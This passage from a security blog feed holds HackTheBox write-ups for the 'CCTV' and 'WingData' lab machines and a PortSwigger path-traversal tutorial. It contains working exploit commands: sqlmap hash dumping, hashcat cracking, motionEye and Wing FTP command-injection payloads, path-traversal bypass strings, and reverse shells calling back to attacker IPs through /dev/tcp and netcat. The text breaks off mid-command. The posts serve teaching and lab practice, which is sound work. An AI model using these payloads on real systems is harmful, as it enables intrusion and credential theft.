(<code>F12</code> → <strong>Inspect</strong> → <strong>Application</strong> tab → <strong>Storage</strong> → <strong>Cookies</strong>) and fired up <code>sqlmap</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sqlmap -u <span class="string">&quot;http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1&quot;</span> \</span><br><span class="line">  --cookie=<span class="string">&quot;ZMSESSID=[REDACTED]&quot;</span> --dump -T Users -D zm</span><br></pre></td></tr></table></figure><p>sqlmap identified the injection point by detecting delayed responses, confirming a time-based blind SQL injection. This method is inherently slow since each bit of data is inferred through timing differences rather than direct output — but it got there:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[16:54:16] [INFO] resumed: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApWxcIFQcURnm5N.rhlULwM0jrtbm</span><br><span class="line">[16:54:16] [INFO] resumed: superadmin</span><br><span class="line">[16:54:16] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............. (done)</span><br><span class="line">[16:54:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent po</span><br><span class="line">tential disruptions</span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? [Y/n] Y</span><br><span class="line">05prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.</span><br><span class="line">[16:58:51] [INFO] retrieved: mark</span><br><span class="line">[16:59:07] [INFO] retrieved: $2y$10$t5z8uIT.n9uCdHCNidcLF.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m</span><br><span class="line"></span><br><span class="line">Database: zm</span><br><span class="line">Table: Users</span><br><span class="line">[3 entries]</span><br><span class="line">+------------+--------------------------------------------------------------+</span><br><span class="line">| Username   | Password                                                      |</span><br><span class="line">+------------+--------------------------------------------------------------+</span><br><span class="line">| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApWxcIFQcURnm5N.rhlULwM0jrtbm   |</span><br><span class="line">| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.  |</span><br><span class="line">| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLF.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m   |</span><br><span class="line">+------------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>Three bcrypt hashes recovered: <code>superadmin</code>, <code>mark</code>, and <code>admin</code>.</p><hr><h2 id="3-Cracking-and-Lateral-Movement"><a href="#3-Cracking-and-Lateral-Movement" class="headerlink" title="3. Cracking and Lateral Movement"></a>3. Cracking and Lateral Movement</h2><p>I focused on <code>mark</code>‘s hash. The extracted hashes were bcrypt, which is intentionally slow to resist brute-force attacks. Using <code>hashcat</code> with <code>rockyou.txt</code>, the password for user <code>mark</code> was successfully cracked:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ hashcat -m 3200 mark_hash.txt /home/kali/Downloads/rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))</span><br><span class="line">Hash.Target......: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.</span><br><span class="line">...</span><br><span class="line">Candidates.#01...: possum -&gt; fatboy1</span><br><span class="line">...</span><br><span class="line">$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame</span><br><span class="line"></span><br><span class="line">Status...........: Cracked</span><br></pre></td></tr></table></figure><p>Password for <code>mark</code> cracked as <code>opensesame</code> — indicating weak password selection despite strong hashing. Strong hashing alone is insufficient if users choose predictable passwords.</p><p>With these credentials I established an SSH session:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh mark@cctv.htb</span><br></pre></td></tr></table></figure><p>Once inside, I checked for internal services with <code>ss -tlnp</code> and discovered <strong>motionEye</strong> running locally on port <strong>8765</strong>. This demonstrates a common security assumption: services bound to localhost are considered safe. However, once SSH access is obtained, these internal services become reachable and exploitable.</p><p>To reach the dashboard from my local machine, I set up an SSH tunnel (used local port <code>8766</code> since <code>8765</code> was already taken on my machine):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh -N -L 127.0.0.1:8766:127.0.0.1:8766 mark@cctv.htb</span><br></pre></td></tr></table></figure><p>Navigating to <code>http://127.0.0.1:8766</code> brought me to the motionEye login page.</p><hr><h2 id="4-Privilege-Escalation-—-CVE-2025-60787-motionEye-Command-Injection"><a href="#4-Privilege-Escalation-—-CVE-2025-60787-motionEye-Command-Injection" class="headerlink" title="4. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)"></a>4. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)</h2><p>To log in as admin, I read the <code>motion.conf</code> file on the target, which contained the admin password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mark@cctv:~$ <span class="built_in">cat</span> /etc/motioneye/motion.conf</span><br><span class="line"><span class="comment"># @admin_username admin</span></span><br><span class="line"><span class="comment"># @normal_username user</span></span><br><span class="line"><span class="comment"># @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0</span></span><br><span class="line"><span class="comment"># @lang en</span></span><br><span class="line"><span class="comment"># @enabled on</span></span><br><span class="line"><span class="comment"># @normal_password</span></span><br></pre></td></tr></table></figure><h3 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h3><p><strong>CVE-2025-60787</strong> is a command injection vulnerability in motionEye. The web UI accepts arbitrary strings for fields such as <strong>Image File Name</strong> and writes them directly into <code>/etc/motioneye/camera-*.conf</code>. When motionEye restarts the underlying <code>motion</code> binary, these fields are treated as shell-expandable — so injected <code>$()</code>&#x2F;backtick syntax executes as a shell command.</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dashboard (Web UI)</span><br><span class="line">      ↓</span><br><span class="line">ConfigHandler.set_config()</span><br><span class="line">      ↓</span><br><span class="line">camera-*.conf written (unsanitized)</span><br><span class="line">      ↓</span><br><span class="line">motionctl.restart()</span><br><span class="line">      ↓</span><br><span class="line">motion parses config → executes payload</span><br></pre></td></tr></table></figure><p>The web UI has <strong>client-side only</strong> JavaScript validation blocking shell metacharacters in the filename field — the server never re-validates the input. This is a classic trust boundary violation.</p><h3 id="The-Bypass"><a href="#The-Bypass" class="headerlink" title="The Bypass"></a>The Bypass</h3><p>I opened the browser console (<code>F12</code>) and redefined the validation function so it always passes:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">configUiValid = <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;;</span><br></pre></td></tr></table></figure><p><img src="/img/cctv-bypass-validation.png" alt="Redefining the client-side validation function"></p><p>With the restriction lifted, I injected a reverse shell payload into <strong>Still Images → Image File Name</strong>, keeping the required <code>.%Y-%m-%d-%H-%M-%S</code> suffix so the field still “looks” valid to the app:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python3 -c &#x27;import os;os.system(&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.15.36/4444 0&gt;&amp;1\&quot;&quot;&#x27;)).%Y-%m-%d-%H-%M-%S</span><br></pre></td></tr></table></figure><p>The payload is wrapped in <code>$()</code> to force command execution in a subshell, while preserving the filename format expected by the application.</p><p><img src="/img/cctv-payload-upload.png" alt="Injecting the reverse shell payload into Image File Name"></p><h3 id="Triggering-Root"><a href="#Triggering-Root" class="headerlink" title="Triggering Root"></a>Triggering Root</h3><p>The payload only executes when a snapshot is actually taken. Since <code>motion</code> runs as <strong>root</strong>, this is the critical misconfiguration that enables privilege escalation — any command executed through this interface inherits root privileges, turning a simple command injection into a full system compromise.</p><p>I triggered the snapshot via the internal API:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mark@cctv:~$ curl <span class="string">&quot;http://127.0.0.1:7999/1/action/snapshot&quot;</span></span><br></pre></td></tr></table></figure><p>Immediately, my listener caught the connection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.15.36] from (UNKNOWN) [10.129.26.87] 47142</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (5054): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@cctv:/etc/motioneye# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@cctv:/etc/motioneye#</span><br></pre></td></tr></table></figure><p><code>whoami</code> → <code>root</code>. Full system compromise.</p><hr><h2 id="Security-Impact"><a href="#Security-Impact" class="headerlink" title="Security Impact"></a>Security Impact</h2><p>This attack chain demonstrates how multiple low-to-medium severity issues combine into a critical compromise:</p><table><thead><tr><th>Stage</th><th>Technique</th><th>CVE</th></tr></thead><tbody><tr><td><strong>Initial access</strong></td><td>Default credentials (<code>admin:admin</code>) on ZoneMinder</td><td>—</td></tr><tr><td><strong>Credential exposure</strong></td><td>Time-based blind SQL injection in <code>tid</code> parameter</td><td>CVE-2024-51482</td></tr><tr><td><strong>Account compromise</strong></td><td>Weak password, bcrypt hash cracked via hashcat + rockyou.txt</td><td>—</td></tr><tr><td><strong>Attack surface expansion</strong></td><td>Localhost-only motionEye service reachable post-SSH via tunnel</td><td>—</td></tr><tr><td><strong>Remote code execution as root</strong></td><td>Client-side-only validation bypass → command injection in filename field</td><td>CVE-2025-60787</td></tr></tbody></table><p>This shows how chaining vulnerabilities is often more dangerous than individual flaws, as attackers rarely rely on a single point of failure.</p><h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><ul><li><strong>Default credentials are still a top-tier real-world risk.</strong> Any publicly exposed admin panel with unchanged defaults is an instant foothold.</li><li><strong>Never build raw SQL from user input.</strong> <code>$sql = &quot;SELECT * FROM Events_Tags WHERE TagId = $tagId&quot;</code> is all it takes — parameterized queries would have closed CVE-2024-51482 entirely.</li><li><strong>Localhost-bound services aren’t inherently safe.</strong> Once any form of shell access (even a low-privilege one) is achieved, “internal-only” services become part of the attack surface.</li><li><strong>Client-side validation is not a security control.</strong> motionEye’s filename sanitization lived entirely in JavaScript — trivially bypassed from the browser console. The server must re-validate everything it will later execute or interpret.</li><li><strong>Never let a privileged process (<code>motion</code> as root) act on unsanitized, attacker-influenced config values.</strong></li></ul><hr><p>Have a nice day, and see you in the next writeup!<br>Any feedback in the comments section is very appreciated. 🙏</p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Linux </tag>
            
            <tag> SQL Injection </tag>
            
            <tag> CVE-2024-51482 </tag>
            
            <tag> CVE-2025-60787 </tag>
            
            <tag> ZoneMinder </tag>
            
            <tag> motionEye </tag>
            
            <tag> Command Injection </tag>
            
            <tag> Default Creds </tag>
            
            <tag> Credential Cracking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Path Traversal</title>
      <link href="/2026/07/01/Path-Traversal/"/>
      <url>/2026/07/01/Path-Traversal/</url>
      
        <content type="html"><![CDATA[<blockquote><p> <strong>Difficulty</strong>: <span style="color:#9fef00">Apprentice</span></p></blockquote><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This path covers directory traversal (a.k.a path traversal) attacks, how applications become vulnerable to them, the various techniques used to bypass common defenses, and how to properly prevent them.</p><span id="more"></span><h2 id="Origins-Of-Path-Traversal"><a href="#Origins-Of-Path-Traversal" class="headerlink" title="Origins Of Path Traversal"></a>Origins Of Path Traversal</h2><p>Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/loadImage?filename=218.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The <code>loadImage</code> URL takes a <code>filename</code> parameter and returns the contents of the specified file. The image files are stored on disk in the location <code>/var/www/images/</code>. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/images/218.png</span><br></pre></td></tr></table></figure><p>This is exactly the kind of concatenation-with-user-input pattern that also causes <span style="color:#9fef00">CRITICAL</span> vulnerabilities like SQLi, except here the injection point is a filesystem path instead of a query.</p><h2 id="Exploiting-The-Vulnerability"><a href="#Exploiting-The-Vulnerability" class="headerlink" title="Exploiting The Vulnerability"></a>Exploiting The Vulnerability</h2><p>If the application implements no defenses against path traversal attacks, an attacker can request the following URL to retrieve the <code>/etc/passwd</code> file from the server’s filesystem:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/loadImage?filename=../../../etc/passwd</span><br></pre></td></tr></table></figure><p>This causes the application to read from the following file path:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/images/../../../etc/passwd</span><br></pre></td></tr></table></figure><p>The sequence <code>../</code> is valid within a file path, and means to step up one level in the directory structure. The three consecutive <code>../</code> sequences step up from <code>/var/www/images/</code> to the filesystem root, and so the file that is actually read is:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure><p>On Windows, both <code>../</code> and <code>..\</code> are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini</span><br></pre></td></tr></table></figure><h2 id="Bypassing-Common-Defenses"><a href="#Bypassing-Common-Defenses" class="headerlink" title="Bypassing Common Defenses"></a>Bypassing Common Defenses</h2><p>If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.</p><ul><li><p><strong>Absolute path</strong> - You might be able to use an absolute path from the filesystem root, such as <code>filename=/etc/passwd</code>, to directly reference a file without using any traversal sequences.</p></li><li><p><strong>Nested traversal sequences</strong> - You might be able to use nested traversal sequences, such as <code>....//</code> or <code>....\/</code>. These revert to simple traversal sequences when the inner sequence is stripped.</p></li><li><p><strong>Encoding</strong> - In some contexts, such as in a URL path or the <code>filename</code> parameter of a <code>multipart/form-data</code> request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the <code>../</code> characters. This results in <code>%2e%2e%2f</code> and <code>%252e%252e%252f</code> respectively. Various non-standard encodings, such as <code>..%c0%af</code> or <code>..%ef%bc%8f</code>, may also work.</p></li><li><p><strong>Required base folder</strong> - An application may require the user-supplied filename to start with the expected base folder, such as <code>/var/www/images</code>. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: <code>filename=/var/www/images/../../../etc/passwd</code>.</p></li><li><p><strong>Required file extension</strong> - An application may require the user-supplied filename to end with an expected file extension, such as <code>.png</code>. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: <code>filename=../../../etc/passwd%00.png</code>.</p></li></ul><div class="note warning flat"><p><strong>ALWAYS TEST MULTIPLE BYPASS TECHNIQUES TOGETHER, DEFENSES ARE OFTEN STACKED AND A SINGLE ENCODING TRICK MIGHT NOT BE ENOUGH ON ITS OWN</strong></p></div><h2 id="How-To-Prevent-Path-Traversal"><a href="#How-To-Prevent-Path-Traversal" class="headerlink" title="How To Prevent Path Traversal"></a>How To Prevent Path Traversal</h2><p>The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way, for example by using a lookup index instead of the actual filename.</p><p>If you can’t avoid passing user-supplied input to filesystem APIs, we recommend using two layers of defense to prevent attacks:</p><ul><li>Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn’t possible, verify that the input contains only permitted content, such as alphanumeric characters only.</li><li>After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.</li></ul><p>Below is an example of some simple Java code to validate the canonical path of a file based on user input:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// process file</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Path traversal is a deceptively simple vulnerability, one unsanitized <code>filename</code> parameter is all it takes to read arbitrary files off the server. Defenses that strip <code>../</code> naively can almost always be bypassed with nesting, encoding, or null bytes, so the only reliable fix is validating input against a whitelist and canonicalizing the resulting path before using it.</p><div class="note info flat"><p>And I highly recommend scripting the lab solvings in python to learn new things and develop the mindset for creating your own tools.<br>As a reference here is my repo where I pushed my scripts: <a href="https://github.com/0xkoat/portswigger_scripts/tree/main/Path_Traversal">Path Traversal Scripts Repo</a></p></div><p>Have a nice day, and see you again in the next Article!<br>Any feedback in the comments section is very appreciated.<br>Thank you for your attention.</p>]]></content>
      
      
      <categories>
          
          <category> Portswigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Portswigger </tag>
            
            <tag> Web Security </tag>
            
            <tag> Path Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WingData</title>
      <link href="/2026/06/25/WingData/"/>
      <url>/2026/06/25/WingData/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>Difficulty</strong>: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; <strong>Category</strong>: <span style="color:#9fef00">Linux</span></p></blockquote><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>WingData is an Easy Linux machine centred around <strong>Wing FTP Server</strong> — a self-hosted FTP&#x2F;HTTP file server accessible via a virtual host. The attack path chains together two real-world CVEs:</p><ol><li><strong>CVE-2025-47812</strong> — Null byte injection in Wing FTP Server allows unauthenticated Remote Code Execution via Lua session file poisoning.</li><li><strong>CVE-2025-4517</strong> — A Python <code>tarfile</code> filter bypass using symlinks and hardlinks to perform arbitrary file write, escalating from a low-privilege shell to root.</li></ol><span id="more"></span><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h3><p>Starting with a full port scan to see what’s exposed:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- 10.129.244.106 -T4</span><br><span class="line">Starting Nmap 7.99 ( https://nmap.org )</span><br><span class="line">Nmap scan report <span class="keyword">for</span> wingdata.htb (10.129.244.106)</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>Two ports open — SSH on 22 and HTTP on 80. A service version scan reveals more detail:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sC -sV -p22,80 10.129.244.106</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.66</span><br><span class="line">|_http-title: WingData Solutions</span><br></pre></td></tr></table></figure><hr><h3 id="Virtual-Host-Enumeration"><a href="#Virtual-Host-Enumeration" class="headerlink" title="Virtual Host Enumeration"></a>Virtual Host Enumeration</h3><p>The machine is running Apache as a reverse proxy. Fuzzing for virtual hosts reveals an interesting subdomain:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ gobuster vhost -u http://wingdata.htb \</span><br><span class="line">  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \</span><br><span class="line">  --append-domain -xs 300-500</span><br><span class="line"></span><br><span class="line">Found: ftp.wingdata.htb  Status: 200 [Size: 678]</span><br></pre></td></tr></table></figure><p>Adding <code>ftp.wingdata.htb</code> to <code>/etc/hosts</code> and navigating to it reveals a <strong>Wing FTP Server</strong> web interface — a self-hosted FTP management panel with anonymous login enabled.</p><p><img src="/img/wingdata-ftp-panel.png" alt="Wing FTP Server web interface at ftp.wingdata.htb"></p><hr><h2 id="Foothold-—-CVE-2025-47812-Wing-FTP-Null-Byte-RCE"><a href="#Foothold-—-CVE-2025-47812-Wing-FTP-Null-Byte-RCE" class="headerlink" title="Foothold — CVE-2025-47812 (Wing FTP Null Byte RCE)"></a>Foothold — CVE-2025-47812 (Wing FTP Null Byte RCE)</h2><h3 id="What-is-CVE-2025-47812"><a href="#What-is-CVE-2025-47812" class="headerlink" title="What is CVE-2025-47812?"></a>What is CVE-2025-47812?</h3><blockquote><p><strong>CVE-2025-47812</strong> is a critical Remote Code Execution vulnerability in <strong>Wing FTP Server &lt; 7.4.4</strong>. The flaw lies in how the server processes the <code>username</code> field during authentication: if a <strong>null byte (<code>%00</code>)</strong> is present in the username, the server only evaluates the portion <em>before</em> the null byte for authentication purposes — anything after it is ignored for the auth check but <strong>still written into the session file</strong>.</p></blockquote><p>Wing FTP stores session data as <strong>Lua script files</strong> in its <code>/session/</code> directory. The session file for a user looks like this:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[<span class="string">&quot;username&quot;</span>] = <span class="string">[[ anonymous ]]</span></span><br></pre></td></tr></table></figure><p>An attacker can craft a username that:</p><ol><li>Passes authentication (e.g. <code>anonymous</code> before <code>%00</code>)</li><li>Injects arbitrary Lua code <em>after</em> the null byte, which closes the string literal and executes as code</li></ol><p><strong>The exploit chain:</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Login <span class="keyword">with</span>: anonymous%<span class="number">00</span>]]&lt;lua payload&gt;<span class="comment">--</span></span><br><span class="line"><span class="number">2.</span> Wing FTP writes <span class="keyword">the</span> full username (including Lua) <span class="built_in">to</span> <span class="keyword">the</span> session <span class="built_in">file</span></span><br><span class="line"><span class="number">3.</span> The ]] closes <span class="keyword">the</span> [[ <span class="keyword">string</span> literal → remaining content executes <span class="keyword">as</span> Lua</span><br><span class="line"><span class="number">4.</span> Triggering <span class="keyword">any</span> authenticated endpoint (e.g. /dir.html) loads <span class="keyword">and</span> runs <span class="keyword">the</span> session <span class="built_in">file</span></span><br></pre></td></tr></table></figure><hr><h3 id="Step-1-Verify-RCE-with-whoami"><a href="#Step-1-Verify-RCE-with-whoami" class="headerlink" title="Step 1: Verify RCE with whoami"></a>Step 1: Verify RCE with <code>whoami</code></h3><p>First, test the vulnerability with a simple <code>whoami</code> command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST <span class="string">&quot;http://ftp.wingdata.htb/loginok.html&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Referer: http://ftp.wingdata.htb/login.html?lang=english&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;username=anonymous%00]]%0dlocal+h+%3d+io.popen(%22whoami%22)%0dlocal+r+%3d+h%3aread(%22*a%22)%0dh%3aclose()%0dprint(r)%0d--&amp;password=anonymous&amp;password_val=&quot;</span> \</span><br><span class="line">  -c /tmp/cookies_1.txt</span><br></pre></td></tr></table></figure><p>Triggering the session:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST <span class="string">&quot;http://ftp.wingdata.htb/dir.html&quot;</span> \</span><br><span class="line">  -b /tmp/cookies_1.txt</span><br><span class="line"></span><br><span class="line">wingftp   ← RCE confirmed!</span><br></pre></td></tr></table></figure><p>The server is running as the <code>wingftp</code> user.</p><hr><h3 id="Step-2-Get-a-Reverse-Shell"><a href="#Step-2-Get-a-Reverse-Shell" class="headerlink" title="Step 2: Get a Reverse Shell"></a>Step 2: Get a Reverse Shell</h3><p>Set up a listener on port 1234, then inject a netcat reverse shell payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Payload (URL-decoded):</span></span><br><span class="line"><span class="comment"># anonymous\x00]]</span></span><br><span class="line"><span class="comment"># local h = io.popen(&quot;nc 10.10.15.30 1234 -e /bin/bash&quot;)</span></span><br><span class="line"><span class="comment"># local r = h:read(&quot;*a&quot;)</span></span><br><span class="line"><span class="comment"># h:close()</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># --</span></span><br><span class="line"></span><br><span class="line">curl -s -X POST <span class="string">&quot;http://ftp.wingdata.htb/loginok.html&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Referer: http://ftp.wingdata.htb/login.html?lang=english&quot;</span> \</span><br><span class="line">  -H <span 